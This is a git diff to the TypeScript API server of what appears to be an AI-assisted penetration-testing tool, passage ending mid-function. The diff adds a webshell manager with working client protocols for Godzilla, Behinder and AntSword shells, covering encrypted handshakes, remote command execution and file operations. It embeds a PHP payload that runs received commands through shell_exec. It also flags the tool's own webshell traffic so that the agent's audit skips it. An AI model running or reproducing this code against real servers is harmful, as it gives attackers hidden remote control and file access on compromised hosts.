@@ -11,15 +11,13 @@
  * POST /api/proxy/restart   重启代理（换端口用 PUT /api/config）
  */
 import { createServer, type IncomingMessage, type ServerResponse } from 'node:http'
-import { request as httpRequest } from 'node:http'
-import { request as httpsRequest } from 'node:https'
+import crypto from 'node:crypto'
 import { spawn } from 'node:child_process'
 import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
 import { connect } from 'node:net'
 import { SOUL_PERSONA, USER_PROFILE } from './persona.ts'
 import { homedir, tmpdir } from 'node:os'
 import { join } from 'node:path'
-import { HttpsProxyAgent } from 'https-proxy-agent'
 import WebSocket from 'ws'
 import { decodeBody } from './mitm.ts'
 import os from 'node:os'
@@ -28,6 +26,8 @@ import type { ChromeBrowser } from './browser.ts'
 import type { FirefoxBrowser } from './firefox.ts'
 import type { SshSession } from './ssh.ts'
 import { AgentBridgeClient } from './bridge.ts'
+import zlib from 'node:zlib'
+import { godzillaPhpEncode, godzillaPhpEncodeRaw, godzillaPhpDecode, godzillaPhpDecodeFull, godzillaSerializeParams, godzillaSerializeGzip, godzillaJspEncode, godzillaJspEncodeRaw, godzillaJspDecode, godzillaJspDecodeRaw, godzillaJspEncodeParams, godzillaCshapEncode, godzillaCshapEncodeRaw, godzillaCshapDecode, godzillaCshapDecodeRaw, behinderAesEncode, behinderAesDecode, behinderXorEncode, behinderXorDecode, antSwordPhpEncode, xorCrypt } from './webshell.ts'
 
 /** 漏洞记录（Agent CRUD + UI 展示） */
 export interface Vuln {
@@ -111,6 +111,7 @@ export class ApiServer {
     this.probeHermes()
     setInterval(() => this.probeHermes(), 5000)  // HERMES AGENT 状态实时探测
     this.loadVulns()
+    this.loadWebshells()
     void this.ensureHermesProfile()  // 自动确保 hermespentbox 独立档案（含 persona/用户画像）
     setTimeout(() => this.ensureSkills(), 3000)  // 档案就绪后确保内置红队技能库（102 技能）
     this.startAnalyzeLoop()
@@ -145,7 +146,13 @@ export class ApiServer {
     }
     if (this.flows.length > this.cap) this.flows.splice(0, this.flows.length - this.cap)
     // 所有 HTTP/HTTPS 流量自动入 Agent 分析队列（消息队列：FIFO 逐个消费；带完整报文快照）
-    if (f.method !== 'WS') this.enqueueAnalyze(f.id, f.detail, f.url)
+    // 跳过审计：应用自身流量（WebShell/Repeater，self 标记）|| 渗透窗口（子 Agent 渗透期间的流量，防循环）
+    if (!f.self && !this.penetrating && f.method !== 'WS') {
+      this.enqueueAnalyze(f.id, f.detail, f.url)
+    } else if (f.method !== 'WS' && f.id) {
+      // 跳过的流量：analyzeMap 标记 done + skipped（流量表 Agent 列显示跳过 ICON），不入分析队列
+      this.analyzeMap.set(f.id, { state: 'done', vuln: false, skipped: true, self: !!f.self, penetrate: !!f.self && this.penetrating, detail: f.detail, url: f.url })
+    }
     const { detail: _d, ...meta } = f
     this.pushSse(meta)
   }
@@ -165,7 +172,7 @@ export class ApiServer {
 
   // ---------------- Agent 分析队列（流量逐个入队，外部 Agent 消费 /api/analyze/next 并写回结果） ----------------
   private analyzeQueue: number[] = []
-  private analyzeMap = new Map<number, { state: 'queued' | 'analyzing' | 'done'; vuln?: boolean; level?: string; detail?: unknown; url?: string; sensitive?: { type: string; value: string }[] }>()
+  private analyzeMap = new Map<number, { state: 'queued' | 'analyzing' | 'done'; vuln?: boolean; level?: string; detail?: unknown; url?: string; sensitive?: { type: string; value: string }[]; skipped?: boolean; builtin?: boolean; self?: boolean; penetrate?: boolean }>()
   /** 全局情报 digest：所有槽分析结论/凭据/渗透状态/取消记录结构化汇总（注入每次分析 prompt——子 Agent 共享上下文，防记忆割裂） */
   private analysisDigest: DigestEntry[] = []
   /** 已推送意见卡的去重 key（无协议 Host+路径+查询 | 渗透方式）：同 URL 同方式不再重复推送；不同方式可再推（与"不同方式可再渗"一致） */
@@ -349,6 +356,11 @@ export class ApiServer {
   /** 新流量入分析队列（消息队列：FIFO，逐个消费；入队即快照完整请求/响应报文） */
   private enqueueAnalyze(id: number, detail?: unknown, url?: string): void {
     if (this.analyzeMap.has(id)) return
+    // HermesPentBox 自身产生的流量（WebShell / Repeater 等带 x-pentbox-source 标记）：直接跳过 Agent 审计（done + 跳过 icon）
+    if (this.isPentboxOwnTraffic(detail)) {
+      this.analyzeMap.set(id, { state: 'done', vuln: false, builtin: true, detail, url })
+      return
+    }
     // 浏览器自带流量（更新/字典/遥测/OCSP）：不送 Agent 直接 done（跳过 icon），不占 Hermes 队列
     if (this.isBrowserBuiltin(detail, url)) {
       this.analyzeMap.set(id, { state: 'done', vuln: false, builtin: true, detail, url })
@@ -421,6 +433,17 @@ export class ApiServer {
     const s = (typeof detail === 'string' ? detail : JSON.stringify(detail ?? '')) + ' ' + (url ?? '')  // url 参与匹配（detail 无路径时黑名单 URL 规则仍命中）
     if (!s.trim()) return false
     return ApiServer.BROWSER_TRAFFIC.some((re) => re.test(s))
+  }
+
+  /** HermesPentBox 自身流量（WebShell 命令执行 / Repeater 等）：请求带 x-pentbox-source 标记头 → 跳过 Agent 审计 */
+  private isPentboxOwnTraffic(detail?: unknown): boolean {
+    const reqHeaders = (detail as { reqHeaders?: Record<string, string> })?.reqHeaders
+    if (reqHeaders) {
+      const src = String(reqHeaders['x-pentbox-source'] || '').toLowerCase()
+      if (src === 'webshell' || src === 'repeater') return true
+    }
+    const s = typeof detail === 'string' ? detail : JSON.stringify(detail ?? '')
+    return /x-pentbox-source[":]?\s*["']?(webshell|repeater)/i.test(s)
   }
 
   // ---------------- 本地 Hermes 分析器（CLI 子进程；独立档案 HermesPentBox + 10 槽会话负载均衡） ----------------
@@ -723,6 +746,27 @@ export class ApiServer {
   private vulns: Vuln[] = []
   private vulnSeq = 0
   private vulnFile = ''
+  // ---------------- WebShell 管理（CRUD 持久化 ~/.pentbox/webshells.json；exec/ping 经内置代理发出，流量可被面板捕获） ----------------
+  private webshells: { id: number; type: string; script: string; url: string; password: string; key: string; status: string; ts: number; cryption?: string; payload?: string; encoding?: string; headers?: string; reqLeft?: string; reqRight?: string; connTimeout?: number; readTimeout?: number; remark?: string }[] = []
+  private wsSeq = 0
+  /** Suo5 正向代理进程（HTTP 隧道，本地 SOCKS5） */
+  private suo5Proc: { proc: ReturnType<typeof spawn>; port: number; url: string } | null = null
+  private wsFile = ''
+  /** WebShell 会话 cookie（按 URL 保持 PHPSESSID，哥斯拉/冰蝎握手+执行需同一 session） */
+  private wsCookies = new Map<string, string>()
+  private loadWebshells(): void {
+    try {
+      this.wsFile = join(homedir(), '.pentbox', 'webshells.json')
+      if (existsSync(this.wsFile)) {
+        const data = JSON.parse(readFileSync(this.wsFile, 'utf8')) as typeof this.webshells
+        this.webshells = Array.isArray(data) ? data : []
+        this.wsSeq = this.webshells.reduce((m, v) => Math.max(m, v.id), 0)
+      }
+    } catch { this.webshells = [] }
+  }
+  private saveWebshells(): void {
+    try { mkdirSync(dirname(this.wsFile), { recursive: true }); writeFileSync(this.wsFile, JSON.stringify(this.webshells, null, 2)) } catch { /* 落盘失败不阻断 */ }
+  }
 
   private loadVulns(): void {
     try {
@@ -745,6 +789,312 @@ export class ApiServer {
       mkdirSync(dirname(this.vulnFile), { recursive: true })
       writeFileSync(this.vulnFile, JSON.stringify(this.vulns, null, 2))
     } catch { /* 落盘失败不阻断 */ }
+  }
+
+  /** 哥斯拉 PhpDynamicPayload 服务端代码（从 assets/payloads/php/payload.php 内嵌，握手时发送） */
+  private godzillaPhpPayload(): Buffer {
+    const candidates = [
+      join(process.cwd(), 'assets', 'payloads', 'php', 'payload.php'),
+      join(__dirname, '..', 'assets', 'payloads', 'php', 'payload.php'),
+    ]
+    const found = candidates.find((p) => existsSync(p))
+    if (found) return readFileSync(found)
+    // 兜底：内置精简版（仅 execCommand，不依赖 session）
+    return Buffer.from(`<?php
+function run($pms){global $parameters;$parameters=array();formatParameter($pms);echo execCommand();}
+function formatParameter($pms){global $parameters;$index=0;$key=null;while(true){$q=$pms[$index];if(ord($q)==2){$len=bytesToInteger(getBytes(substr($pms,$index+1,4)),0);$index+=4;$value=substr($pms,$index+1,$len);$index+=$len;$parameters[$key]=$value;$key=null;}else{$key.=$q;}$index++;if($index>strlen($pms)-1)break;}}
+function bytesToInteger($bytes,$position){$val=0;$val=$bytes[$position+3]&255;$val<<=8;$val|=$bytes[$position+2]&255;$val<<=8;$val|=$bytes[$position+1]&255;$val<<=8;$val|=$bytes[$position]&255;return $val;}
+function getBytes($string){$bytes=array();for($i=0;$i<strlen($string);$i++)array_push($bytes,ord($string[$i]));return $bytes;}
+function get($key){global $parameters;return isset($parameters[$key])?$parameters[$key]:null;}
+function execCommand(){@ob_start();$cmdLine=get("cmdLine");echo shell_exec($cmdLine." 2>&1");return ob_get_clean();}
+function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:root ProcessArch:amd64 canCallGzipDecode:0 canCallGzipEncode:0 systempdir:/tmp";}
+`, 'utf8')
+  }
+
+  /** 经内置代理发送 WebShell HTTP 请求（复用代理链，流量进流量面板）→ {code, body} */
+  private wsRequest(w: { url: string; type: string; headers?: string; readTimeout?: number }, method: string, url: string, body?: string | Buffer, ct?: string): Promise<{ code: number; body: Buffer }> {
+    return new Promise((resolve, reject) => {
+      let u: URL
+      try { u = new URL(url) } catch (e) { return reject(new Error(`URL 无效: ${url}`)) }
+      // 经代理引擎内部转发：流量正常记录（self 标记 → 跳过 Agent 审计），不添加任何特征头
+      const headers: Record<string, string> = { host: u.host }
+      // 自定义请求头（哥斯拉 headers 字段，\r\n 分隔）
+      if (w.headers) {
+        for (const line of w.headers.split(/\r?\n/)) {
+          const idx = line.indexOf(':')
+          if (idx > 0) { const k = line.slice(0, idx).trim(); const v = line.slice(idx + 1).trim(); if (k.toLowerCase() !== 'host' && k.toLowerCase() !== 'content-length') headers[k] = v }
+        }
+      }
+      if (ct) headers['content-type'] = ct
+      // 显式 Content-Length：原版 JSP shell 用 request.getHeader("Content-Length") 读取 body
+      if (body !== undefined && body !== null) {
+        headers['content-length'] = String(Buffer.isBuffer(body) ? body.length : Buffer.byteLength(String(body)))
+      }
+      // 会话 cookie：按 URL 保持（哥斯拉/冰蝎握手+执行需同一 PHPSESSID）
+      const cookie = this.wsCookies.get(u.href)
+      if (cookie) headers['cookie'] = cookie
+      const bufBody = body === undefined || body === null ? undefined : (Buffer.isBuffer(body) ? body : Buffer.from(body))
+      this.engine.forwardInternal(u, method, headers, bufBody)
+        .then((r) => {
+          // 保存 Set-Cookie（保持 session）
+          const sc = r.headers['set-cookie']
+          if (sc) {
+            const first = (Array.isArray(sc) ? sc[0] : sc).split(';')[0]
+            if (first) this.wsCookies.set(u.href, first)
+          }
+          resolve({ code: r.code, body: r.body })
+        })
+        .catch(reject)
+    })
+  }
+
+  /**
+   * WebShell 命令执行（完整协议）：
+   * - custom：GET ?cmd= 参数模式（基础一句话）
+   * - antsword：POST shell=<base64 PHP 代码> 执行任意 PHP
+   * - godzilla：XOR+base64（PHP）或 AES-ECB（JSP）加密协议 + session 会话
+   * - behinder：AES-128-CBC（默认）或 XOR 协议 + func|params 格式
+   */
+  private async wsExecShell(w: { id: number; type: string; script: string; url: string; password: string; key: string; cryption?: string; payload?: string; encoding?: string; headers?: string; connTimeout?: number; readTimeout?: number }, command: string): Promise<string> {
+    const u = new URL(w.url)
+    const key = w.key || '3c6e0b8a9c15224a'
+
+    // ---- 蚁剑：PHP POST shell=base64(PHP)；JSP POST ?shell=base64(payload class)；ASPX JScript eval(shell) ----
+    if (w.type === 'antsword') {
+      if (w.script === 'jsp' || w.script === 'jspx') {
+        const classPath = join(process.cwd(), 'assets', 'payloads', 'behinder', 'java', 'HermesCmd.class')
+        if (!existsSync(classPath)) throw new Error('蚁剑 JSP payload 缺失: HermesCmd.class')
+        const classB64 = readFileSync(classPath).toString('base64')
+        const sep = w.url.includes('?') ? '&' : '?'
+        const r = await this.wsRequest(w, 'POST', w.url + sep + 'shell=' + encodeURIComponent(classB64) + '&cmd=' + encodeURIComponent(command), '', 'application/x-www-form-urlencoded')
+        return r.body.toString(w.encoding || 'utf8').trim()
+      }
+      if (w.script === 'aspx' || w.script === 'asp') {
+        // 蚁剑 ASPX JScript：POST shell=<JScript 代码>，eval(shell, unsafe) 执行任意 JScript
+        const cmdB64 = Buffer.from(command, 'utf8').toString('base64')
+        const jsCode = `var cmd=System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("${cmdB64}"));try{var psi=new System.Diagnostics.ProcessStartInfo("/bin/sh","-c "+cmd);psi.UseShellExecute=false;psi.RedirectStandardOutput=true;psi.RedirectStandardError=true;var p=System.Diagnostics.Process.Start(psi);Response.Write(p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd());}catch(e){Response.Write("ERR:"+e.message);}`
+        const r = await this.wsRequest(w, 'POST', w.url, `shell=${encodeURIComponent(jsCode)}`, 'application/x-www-form-urlencoded')
+        return r.body.toString(w.encoding || 'utf8').trim()
+      }
+      const phpCode = `echo shell_exec(${JSON.stringify(command)} . ' 2>&1');`
+      const enc = antSwordPhpEncode(phpCode)
+      const sep = w.url.includes('?') ? '&' : '?'
+      const r = await this.wsRequest(w, 'POST', w.url + sep + 'id=1', `shell=${encodeURIComponent(enc)}`, 'application/x-www-form-urlencoded')
+      return r.body.toString(w.encoding || 'utf8').trim()
+    }
+
+    // ---- custom：GET ?pwd=<密码>&cmd= 参数模式（生成的 shell 带 pwd 认证） ----
+    if (w.type === 'custom') {
+      u.searchParams.set('pwd', w.password || 'pass')
+      u.searchParams.set('cmd', command)
+      const r = await this.wsRequest(w, 'GET', u.href)
+      return r.body.toString(w.encoding || 'utf8').trim()
+    }
+
+    // ---- 哥斯拉：XOR（PHP）/ AES-ECB（JSP/ASPX） ----
+    if (w.type === 'godzilla') {
+      const pass = w.password || 'pass'
+      if (w.script === 'php') {
+        // 原版 phpXor 协议：body = XOR(payload) 原始字节（shell 用 php://input 读取后 XOR），响应 = XOR(run 输出)（gzip）
+        // 与原版一致：连接密钥 = md5(用户 key) 前16（GUI 生成 shell 的 $key 也是 md5 前16），密码不嵌入 shell
+        const connKey = crypto.createHash('md5').update(w.key || '3c6e0b8a9c15224a', 'utf8').digest('hex').slice(0, 16)
+        // 1) 握手 POST payload.php 建立 session
+        const payload = this.godzillaPhpPayload()
+        const encHand = godzillaPhpEncodeRaw(payload, connKey)
+        await this.wsRequest(w, 'POST', w.url, encHand, 'application/octet-stream')
+        // 2) 执行命令：序列化参数（methodName=execCommand + cmdLine）
+        const params = godzillaSerializeParams({ methodName: 'execCommand', cmdLine: command })
+        const enc2 = godzillaPhpEncodeRaw(params, connKey)
+        const r2 = await this.wsRequest(w, 'POST', w.url, enc2, 'application/octet-stream')
+        let raw = xorCrypt(r2.body, connKey)
+        if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) {
+          try { raw = zlib.gunzipSync(raw) } catch { /* 非 gzip */ }
+        }
+        return raw.toString(w.encoding || 'utf8').trim()
+      }
+      // 哥斯拉 JSP：AES-ECB。cryption 含 raw → 原版协议（body=原始字节，Content-Length 读取）；否则 base64 协议（pass=base64(AES)，响应 md5+base64）
+      // 连接密钥 = md5(用户 key) 前16（GUI 生成 shell 的 xc 也是 md5 前16）
+      const connKey2 = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
+      const isRawJsp = (w.cryption || '').toLowerCase().includes('raw')
+      const classPath = join(process.cwd(), 'assets', 'payloads', 'java', 'payload.classs')
+      const pmsJsp: Record<string, string> = { methodName: 'execCommand' }
+      if (isRawJsp) {
+        // RAW：body 原始字节
+        const args = command.split(/\s+/).filter((s) => s.length > 0)
+        pmsJsp.argsCount = String(args.length)
+        args.forEach((a, i) => (pmsJsp[`arg-${i}`] = a))
+        if (existsSync(classPath)) {
+          const encHand = godzillaJspEncodeRaw(readFileSync(classPath), connKey2)
+          await this.wsRequest(w, 'POST', w.url, encHand, 'application/octet-stream')
+        }
+        const enc2 = godzillaJspEncodeRaw(godzillaSerializeGzip(pmsJsp), connKey2)
+        const r2 = await this.wsRequest(w, 'POST', w.url, enc2, 'application/octet-stream')
+        const dec2 = godzillaJspDecodeRaw(r2.body, connKey2)
+        return dec2.toString(w.encoding || 'utf8').trim()
+      }
+      // BASE64：pass=base64(AES(...))，响应 md5(pass+xc)前16 + base64(AES(输出)) + md5后16
+      const argsB = command.split(/\s+/).filter((s) => s.length > 0)
+      const pmsB: Record<string, string> = { methodName: 'execCommand', argsCount: String(argsB.length) }
+      argsB.forEach((a, i) => (pmsB[`arg-${i}`] = a))
+      if (existsSync(classPath)) {
+        const encHand = godzillaJspEncode(readFileSync(classPath), connKey2)
+        await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(encHand)}`, 'application/x-www-form-urlencoded')
+      }
+      const enc2b = godzillaJspEncode(godzillaSerializeGzip(pmsB), connKey2)
+      const r2b = await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(enc2b)}`, 'application/x-www-form-urlencoded')
+      const dec2b = godzillaJspDecode(r2b.body.toString('utf8'), connKey2, pass)
+      return dec2b.toString(w.encoding || 'utf8').trim()
+    }
+    // 哥斯拉 ASPX：RijndaelManaged CBC 原版协议（BinaryRead 原始字节），连接密钥 = md5(用户 key) 前16
+    if (w.type === 'godzilla' && (w.script === 'aspx' || w.script === 'asp')) {
+      const connKey = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
+      const dllPath = join(process.cwd(), 'assets', 'payloads', 'csharp', 'payload.dll')
+      if (existsSync(dllPath)) {
+        const dll = readFileSync(dllPath)
+        const encHand = godzillaCshapEncodeRaw(dll, connKey)
+        await this.wsRequest(w, 'POST', w.url, encHand, 'application/octet-stream')
+      }
+      const tok = command.split(/\s+/).filter((s) => s.length > 0)
+      const exe = tok[0] || 'id'
+      const exeArgs = tok.slice(1).join(' ')
+      const pms: Record<string, string> = { methodName: 'execCommand', executableFile: exe, executableArgs: exeArgs }
+      // 参数体 = gzip(serialize)（C# formatParameter 用 GZipStream 解压），RijndaelManaged CBC(key,IV=key) 原始字节
+      const enc2 = godzillaCshapEncodeRaw(godzillaSerializeGzip(pms), connKey)
+      const r2 = await this.wsRequest(w, 'POST', w.url, enc2, 'application/octet-stream')
+      const dec2 = godzillaCshapDecodeRaw(r2.body, connKey)
+      return dec2.toString(w.encoding || 'utf8').trim()
+    }
+
+    // ---- 冰蝎：AES-128-CBC（默认）/ XOR ----
+    if (w.type === 'behinder') {
+      const pass = w.password || 'rebeyond'
+      const cryption = w.cryption || 'aes'
+      // JSP：下发自包含 payload class（HermesCmd.class，反射从 ?cmd= 读命令），服务端 defineClass→newInstance→equals(pageContext)
+      if (w.script === 'jsp' || w.script === 'jspx') {
+        const classPath = join(process.cwd(), 'assets', 'payloads', 'behinder', 'java', 'HermesCmd.class')
+        if (!existsSync(classPath)) throw new Error('冰蝎 JSP payload 缺失: HermesCmd.class')
+        const classBytes = readFileSync(classPath)
+        const enc = behinderAesEncode(classBytes, pass)
+        const sep = w.url.includes('?') ? '&' : '?'
+        const r = await this.wsRequest(w, 'POST', w.url + sep + 'cmd=' + encodeURIComponent(command), enc, 'application/octet-stream')
+        return r.body.toString(w.encoding || 'utf8').trim()
+      }
+      // ASPX：下发 U.dll（RijndaelManaged CBC key/IV=md5密码前16），服务端 Assembly.Load→CreateInstance("U")→Equals(page)
+      if (w.script === 'aspx') {
+        const dllPath = join(process.cwd(), 'assets', 'payloads', 'behinder', 'csharp', 'U.dll')
+        if (!existsSync(dllPath)) throw new Error('冰蝎 ASPX payload 缺失: U.dll')
+        const dll = readFileSync(dllPath)
+        const md5h = crypto.createHash('md5').update(pass, 'utf8').digest('hex').slice(0, 16)
+        const cipher = crypto.createCipheriv('aes-128-cbc', Buffer.from(md5h, 'utf8'), Buffer.from(md5h, 'utf8'))
+        // ASPX 模板 Request.BinaryRead(ContentLength) 直接解密 body 字节（无 base64）
+        const raw = Buffer.concat([cipher.update(dll), cipher.final()])
+        const sep = w.url.includes('?') ? '&' : '?'
+        const r = await this.wsRequest(w, 'POST', w.url + sep + 'cmd=' + encodeURIComponent(command), raw, 'application/octet-stream')
+        return r.body.toString(w.encoding || 'utf8').trim()
+      }
+      // 冰蝎 v2 模板协议：body = base64(AES-ECB(md5(pass)前16, "func|eval代码"))，服务端直接 eval(params)
+      const cmdB64 = Buffer.from(command, 'utf8').toString('base64')
+      const evalCode = `$c=base64_decode("${cmdB64}");$o="";if(function_exists('shell_exec')){$o=shell_exec($c);}elseif(function_exists('exec')){exec($c,$r);$o=implode("\\n",$r);}elseif(function_exists('system')){ob_start();system($c);$o=ob_get_clean();}elseif(function_exists('passthru')){ob_start();passthru($c);$o=ob_get_clean();}echo $o;`
+      const params = Buffer.from('var_dump|' + evalCode, 'utf8')
+      let enc: string
+      if (cryption.includes('xor')) enc = behinderXorEncode(params, pass)
+      else enc = behinderAesEncode(params, pass)
+      const r = await this.wsRequest(w, 'POST', w.url, enc, 'application/octet-stream')
+      let dec: Buffer
+      if (cryption.includes('xor')) dec = behinderXorDecode(r.body.toString('utf8'), pass)
+      else dec = behinderAesDecode(r.body.toString('utf8'), pass)
+      // 模板直接 echo eval 结果（明文），若非明文则用解密结果
+      const out = r.body.toString(w.encoding || 'utf8').trim()
+      return out.length > 0 ? out : dec.toString(w.encoding || 'utf8').trim()
+    }
+
+    throw new Error(`未知 webshell 类型: ${w.type}`)
+  }
+
+  /** 存活校验：哥斯拉走原版 test 协议（握手 + methodName=test → payload.test() 返回 ok）；其他类型执行标识命令 */
+  private async wsAliveShell(w: { id: number; type: string; script: string; url: string; password: string; key: string; cryption?: string; payload?: string; encoding?: string; headers?: string; connTimeout?: number; readTimeout?: number }): Promise<{ alive: boolean; detail?: string; error?: string }> {
+    try {
+      if (w.type === 'godzilla') {
+        const key = w.key || '3c6e0b8a9c15224a'
+        const connKey = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
+        const pass = w.password || 'pass'
+        if (w.script === 'php') {
+          // 握手建立 session → test()
+          const payload = this.godzillaPhpPayload()
+          await this.wsRequest(w, 'POST', w.url, godzillaPhpEncodeRaw(payload, connKey), 'application/octet-stream')
+          const r = await this.wsRequest(w, 'POST', w.url, godzillaPhpEncodeRaw(godzillaSerializeParams({ methodName: 'test' }), connKey), 'application/octet-stream')
+          let raw = xorCrypt(r.body, connKey)
+          if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) { try { raw = zlib.gunzipSync(raw) } catch { /* */ } }
+          const s = raw.toString(w.encoding || 'utf8').trim()
+          return { alive: s.includes('ok'), detail: s.slice(0, 200) }
+        }
+        const classPath = join(process.cwd(), 'assets', 'payloads', 'java', 'payload.classs')
+        if (w.script === 'jsp' || w.script === 'jspx') {
+          const isRawJsp = (w.cryption || '').toLowerCase().includes('raw')
+          const hasClass = existsSync(classPath)
+          if (isRawJsp) {
+            if (hasClass) await this.wsRequest(w, 'POST', w.url, godzillaJspEncodeRaw(readFileSync(classPath), connKey), 'application/octet-stream')
+            const r = await this.wsRequest(w, 'POST', w.url, godzillaJspEncodeRaw(godzillaSerializeGzip({ methodName: 'test' }), connKey), 'application/octet-stream')
+            const s = godzillaJspDecodeRaw(r.body, connKey).toString(w.encoding || 'utf8').trim()
+            return { alive: s.includes('ok'), detail: s.slice(0, 200) }
+          }
+          if (hasClass) await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(readFileSync(classPath), connKey))}`, 'application/x-www-form-urlencoded')
+          const r = await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(godzillaSerializeGzip({ methodName: 'test' }), connKey))}`, 'application/x-www-form-urlencoded')
+          const s = godzillaJspDecode(r.body.toString('utf8'), connKey, pass).toString(w.encoding || 'utf8').trim()
+          return { alive: s.includes('ok'), detail: s.slice(0, 200) }
+        }
+        if (w.script === 'aspx' || w.script === 'asp') {
+          const dllPath = join(process.cwd(), 'assets', 'payloads', 'csharp', 'payload.dll')
+          if (existsSync(dllPath)) await this.wsRequest(w, 'POST', w.url, godzillaCshapEncodeRaw(readFileSync(dllPath), connKey), 'application/octet-stream')
+          const r = await this.wsRequest(w, 'POST', w.url, godzillaCshapEncodeRaw(godzillaSerializeGzip({ methodName: 'test' }), connKey), 'application/octet-stream')
+          const s = godzillaCshapDecodeRaw(r.body, connKey).toString(w.encoding || 'utf8').trim()
+          return { alive: s.includes('ok'), detail: s.slice(0, 200) }
+        }
+      }
+      // 其他类型（冰蝎/蚁剑/自定义）：执行标识命令验证非空响应
+      const out = await this.wsExecShell(w, 'echo pentbox_alive_check')
+      return { alive: out.includes('pentbox_alive_check'), detail: out.slice(0, 200) }
+    } catch (e) {
+      return { alive: false, error: (e as Error).message }
+    }
+  }
+
+  /** 文件操作（参考哥斯拉原版：调 payload 方法 getFile/readFileContent/uploadFile/deleteFile，而非 shell 命令，JSP/PHP/ASPX 均支持） */
+  private async wsFileOp(w: { url: string; type: string; script: string; password: string; key: string; cryption?: string; encoding?: string; headers?: string; readTimeout?: number }, pms: Record<string, string>): Promise<Buffer> {
+    const key = w.key || '3c6e0b8a9c15224a'
+    const pass = w.password || 'pass'
+    if (w.type === 'godzilla') {
+      const connKey = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
+      if (w.script === 'php') {
+        const payload = this.godzillaPhpPayload()
+        await this.wsRequest(w, 'POST', w.url, godzillaPhpEncodeRaw(payload, connKey), 'application/octet-stream')
+        const enc = godzillaPhpEncodeRaw(godzillaSerializeParams(pms), connKey)
+        const r = await this.wsRequest(w, 'POST', w.url, enc, 'application/octet-stream')
+        let raw = xorCrypt(r.body, connKey)
+        if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) { try { raw = zlib.gunzipSync(raw) } catch { /* */ } }
+        return raw
+      }
+      const isRaw = (w.cryption || '').toLowerCase().includes('raw')
+      const classPath = join(process.cwd(), 'assets', 'payloads', 'java', 'payload.classs')
+      const gz = godzillaSerializeGzip(pms)
+      if (w.script === 'jsp' || w.script === 'jspx') {
+        if (isRaw) {
+          if (existsSync(classPath)) await this.wsRequest(w, 'POST', w.url, godzillaJspEncodeRaw(readFileSync(classPath), connKey), 'application/octet-stream')
+          const r = await this.wsRequest(w, 'POST', w.url, godzillaJspEncodeRaw(gz, connKey), 'application/octet-stream')
+          return godzillaJspDecodeRaw(r.body, connKey)
+        }
+        if (existsSync(classPath)) await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(readFileSync(classPath), connKey))}`, 'application/x-www-form-urlencoded')
+        const r = await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(gz, connKey))}`, 'application/x-www-form-urlencoded')
+        return godzillaJspDecode(r.body.toString('utf8'), connKey, pass)
+      }
+      if (w.script === 'aspx' || w.script === 'asp') {
+        const dllPath = join(process.cwd(), 'assets', 'payloads', 'csharp', 'payload.dll')
+        if (existsSync(dllPath)) await this.wsRequest(w, 'POST', w.url, godzillaCshapEncodeRaw(readFileSync(dllPath), connKey), 'application/octet-stream')
+        const r = await this.wsRequest(w, 'POST', w.url, godzillaCshapEncodeRaw(gz, connKey), 'application/octet-stream')
+        return godzillaCshapDecodeRaw(r.body, connKey)
+      }
+    }
+    throw new Error('该类型暂不支持文件操作')
   }
 
   /** WebSocket 单发（连接 → 发送 → 收一条 → 关闭，8s 超时） */
@@ -789,37 +1139,19 @@ export class ApiServer {
     const outHeaders: Record<string, string> = {}
     for (const [k, v] of Object.entries(headers)) if (!skip.has(k.toLowerCase())) outHeaders[k] = v
     if (body.length) outHeaders['content-length'] = String(body.length)
-    // 经内置代理 8899（http 绝对路径 / https CONNECT via HttpsProxyAgent）；带标记头 → 代理转发但不记录流量
-    outHeaders['x-pentbox-source'] = 'repeater'
-    const proxy = `http://127.0.0.1:${this.opts.proxyPort ?? 8899}`
-    const resp = await new Promise<{ statusLine: string; headers: string[]; body: string }>((resolve, reject) => {
-      const done = (res: IncomingMessage) => {
-        const chunks: Buffer[] = []
-        res.on('data', (c: Buffer) => { if (chunks.join('').length < 262144) chunks.push(c) })
-        res.on('end', () => {
-          const buf = Buffer.concat(chunks)
-          const rawLines: string[] = []
-          for (let i = 0; i + 1 < res.rawHeaders.length; i += 2) rawLines.push(`${res.rawHeaders[i]}: ${res.rawHeaders[i + 1]}`)
-          resolve({ statusLine: `HTTP/${res.httpVersion} ${res.statusCode} ${res.statusMessage}`, headers: rawLines, body: decodeBody(buf, (res.headers['content-encoding'] as string) || undefined) })
-        })
-        res.on('error', reject)
-      }
-      const opts = { method, headers: outHeaders, signal: AbortSignal.timeout(20000) } as any
-      if (url.protocol === 'https:') {
-        opts.agent = new HttpsProxyAgent(proxy)
-        opts.rejectUnauthorized = false // 经 MITM 终止，node 不认系统 CA
-        opts.hostname = url.hostname
-        opts.port = Number(url.port || 443)
-        opts.path = url.pathname + url.search
-        httpsRequest(opts, done).on('error', reject).end(body)
-      } else {
-        opts.host = '127.0.0.1'
-        opts.port = this.opts.proxyPort ?? 8899
-        opts.path = url.href
-        httpRequest(opts, done).on('error', reject).end(body)
-      }
-    })
-    // 重发器流量不进应用流量表（代理侧已按标记头跳过记录；这里不再主动 push）
+    // 经代理引擎内部转发：流量正常记录（self 标记 → 跳过 Agent 审计），不添加任何特征头
+    const r = await this.engine.forwardInternal(url, method, outHeaders, body)
+    const outLines: string[] = []
+    for (const [k, v] of Object.entries(r.headers)) {
+      if (k.toLowerCase() === 'rawheaders') continue
+      if (Array.isArray(v)) for (const item of v) outLines.push(`${k}: ${item}`)
+      else outLines.push(`${k}: ${v}`)
+    }
+    const resp = {
+      statusLine: `HTTP/1.1 ${r.code}`,
